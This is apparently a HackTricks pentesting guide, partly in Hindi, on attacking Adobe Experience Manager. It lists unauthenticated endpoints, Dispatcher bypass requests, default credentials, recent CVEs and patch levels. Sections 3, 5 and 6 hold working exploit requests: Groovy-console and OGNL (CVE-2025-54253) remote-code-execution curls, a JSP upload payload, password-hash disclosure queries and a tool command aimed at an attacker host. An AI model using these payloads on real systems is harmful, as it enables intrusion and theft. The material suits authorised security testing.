# AEM (Adobe Experience Manager) Pentesting

{{#include ../../banners/hacktricks-training.md}}

> Adobe Experience Manager (AEM, part of the Adobe Experience Cloud) एक एंटरप्राइज़ CMS है जो Apache Sling/Felix (OSGi) और Java Content Repository (JCR) के ऊपर चलता है।
> एक हमलावर के नज़रिए से, AEM इंस्टेंस अक्सर खतरनाक development endpoints, कमजोर Dispatcher नियम, default credentials और कई CVEs को उजागर करते हैं जिन्हें हर तिमाही में पैच किया जाता है।

The checklist below focuses on **externally reachable (unauth) attack surface** that keeps showing up in real engagements (2022-2026).

---

## 1. Fingerprinting
```
$ curl -s -I https://target | egrep -i "aem|sling|cq"
X-Content-Type-Options: nosniff
X-Dispatcher: hu1            # header added by AEM Dispatcher
X-Vary: Accept-Encoding
```
Other quick indicators:
* `/etc.clientlibs/` static path present (returns JS/CSS).
* `/libs/granite/core/content/login.html` लॉगिन पेज जिसमें “Adobe Experience Manager” बैनर है.
* `</script><!--/* CQ */-->` HTML के नीचे टिप्पणी.

---

## 2. High-value unauthenticated endpoints

Path | क्या मिलता है | नोट्स
---- | ------------- | -----
`/.json`, `/.1.json` | JCR nodes **DefaultGetServlet** के माध्यम से | अक्सर ब्लॉक होते हैं, लेकिन *Dispatcher bypass* (नीचे देखें) काम करता है।
`/bin/querybuilder.json?path=/` | QueryBuilder API | Leak: page tree, internal paths, user names.
`/system/console/status-*`, `/system/console/bundles` | OSGi/Felix console | डिफ़ॉल्ट रूप से 403; यदि एक्सपोज़्ड हो और creds मिलें ⇒ bundle-upload RCE.
`/crx/packmgr/index.jsp` | Package Manager | Authenticated content packages की अनुमति देता है → JSP payload upload.
`/etc/groovyconsole/**` | AEM Groovy Console | यदि एक्सपोज़्ड हो → arbitrary Groovy / Java execution.
`/libs/cq/AuditlogSearchServlet.json` | Audit logs | जानकारी का खुलासा.
`/libs/cq/ui/content/dumplibs.html` | ClientLibs dump | XSS vector.
`/adminui/debug` | **AEM Forms on JEE** Struts dev-mode OGNL evaluator | गलत कॉन्फ़िगर किए गए Forms इंस्टॉलेशन्स पर (CVE-2025-54253) यह endpoint बिना प्रमाणीकृत OGNL चलाता है → RCE.

### Dispatcher bypass tricks (still working in 2025/2026)
Most production sites sit behind the *Dispatcher* (reverse-proxy). Filter rules are frequently bypassed by abusing encoded characters or allowed static extensions.

*Classic semicolon + allowed extension*
```
GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1
```
*Encoded slash bypass (2025 KB ka-27832)*
```
GET /%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType HTTP/1.1
```
If the Dispatcher allows encoded slashes, this returns JSON even when `/bin` is supposedly denied.

---

## 3. Common misconfigurations (still alive in 2026)
1. **Anonymous POST servlet** – `POST /.json` with `:operation=import` आपको नए JCR nodes प्लांट करने की अनुमति देता है। Dispatcher में `*.json` POST ब्लॉक करने से यह ठीक हो जाता है।
2. **World-readable user profiles** – डिफ़ॉल्ट ACL सभी को `/home/users/**/profile/*` पर `jcr:read` दे देता है।
3. **Default credentials** – `admin:admin`, `author:author`, `replication:replication`.
4. **WCMDebugFilter** enabled ⇒ `?debug=layout` के माध्यम से reflected XSS (CVE-2016-7882, legacy 6.4 इंस्टाल्स पर अब भी मिलता है)।
5. **Groovy Console exposed** – Groovy स्क्रिप्ट भेजकर remote code execution:
```bash
curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json
```
6. **Dispatcher encoded-slash gap** – `/bin/querybuilder.json` और `/etc/truststore.json` `%2f`/`%3B` के साथ पहुंच योग्य रहते हैं भले ही path filters उन्हें ब्लॉक कर रहे हों।
7. **AEM Forms Struts devMode left enabled** – `/adminui/debug?expression=` बिना auth के OGNL को evaluate करता है (CVE-2025-54253) जिससे unauth RCE होता है; Forms submission में जुड़ा XXE (CVE-2025-54254) file read की अनुमति देता है।

---

## 4. Recent vulnerabilities (service-pack cadence)

Quarter | CVE / Bulletin | Affected | Impact
------- | --- | -------- | ------
Dec 2025 | **APSB25-115**, CVE-2025-64537/64539 | 6.5.24 & earlier, Cloud 2025.12 | Multiple critical/stored XSS → code execution via author UI.
Sep 2025 | APSB25-90 | 6.5.23 & earlier | Security feature bypass chain (Dispatcher auth checker) – upgrade to 6.5.24/Cloud 2025.12.
Aug 2025 | **CVE-2025-54253 / 54254** (AEM Forms JEE) | Forms 6.5.23.0 and earlier | DevMode OGNL RCE + XXE file read, unauthenticated.
Jun 2025 | APSB25-48 | 6.5.23 & earlier | Stored XSS and privilege escalation in Communities components.
Dec 2024 | APSB24-69 (rev. Mar 2025 adds CVE-2024-53962…74) | 6.5.22 & earlier | DOM/Stored XSS, arbitrary code exec (low-priv).
Dec 2023 | APSB23-72 | ≤ 6.5.18 | DOM-based XSS via crafted URL.

हमेशा ग्राहक के service-pack से मेल खाता *APSB* bulletin चेक करें और नवीनतम **6.5.24 (Nov 26, 2025)** या **Cloud Service 2025.12** के लिए दबाव डालें। AEM Forms on JEE के लिए इसका अपना add-on hotfix **6.5.0-0108+** आवश्यक है।

---

## 5. Exploitation snippets

### 5.1 RCE via dispatcher bypass + JSP upload
If anonymous write is possible:
```
# 1. Create a node that will become /content/evil.jsp
POST /content/evil.jsp;%0aa.css HTTP/1.1
Content-Type: application/x-www-form-urlencoded

:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```
अब `/content/evil.jsp` को अनुरोध करें – JSP AEM प्रक्रिया उपयोगकर्ता के रूप में चलता है।

### 5.2 SSRF to RCE (ऐतिहासिक < 6.3)
`/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console`
`aem_ssrf2rce.py` **aem-hacker** से पूरी चेन को ऑटोमेट करता है।

### 5.3 OGNL RCE AEM Forms JEE पर (CVE-2025-54253)
```
# Unauth devMode OGNL to run whoami
curl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start(),%23out=new%20java.io.InputStreamReader(%23p.getInputStream()),%23br=new%20java.io.BufferedReader(%23out),%23br.readLine()"
```
यदि vulnerable है, तो HTTP body में command output होता है।

### 5.4 QueryBuilder hash disclosure (encoded slash bypass)
```
GET /%2fbin%2fquerybuilder.json?path=/home&type=rep:User&p.hits=full&p.nodedepth=2&p.offset=0 HTTP/1.1
```
जब anonymous read ACLs डिफ़ॉल्ट हों तो यह user nodes लौटाता है जिनमें `rep:password` हैश शामिल होते हैं।

---

## 6. उपकरण

* **aem-hacker** – Swiss-army enumeration script, supports dispatcher bypass, SSRF detection, default-creds checks and more.
```bash
python3 aem_hacker.py -u https://target --host attacker-ip
```
* **Tenable WAS plugin 115065** – Detects QueryBuilder hash disclosure & encoded-slash bypass automatically (published Dec 2025).
* **Content brute-force** – पुनरावर्ती रूप से `/_jcr_content.(json|html)` को request करें ताकि hidden components खोजे जा सकें।
* **osgi-infect** – यदि creds उपलब्ध हों तो `/system/console/bundles` के माध्यम से malicious OSGi bundle अपलोड करें।


## References

* [Adobe Security Bulletin APSB25-115 – Security updates for Adobe Experience Manager (Dec 9, 2025)](https://helpx.adobe.com/security/products/experience-manager/apsb25-115.html)
* [BleepingComputer – Adobe issues emergency fixes for AEM Forms zero-days (Aug 5, 2025)](https://www.bleepingcomputer.com/news/security/adobe-issues-emergency-fixes-for-aem-forms-zero-days-after-pocs-released/)
{{#include ../../banners/hacktricks-training.md}}
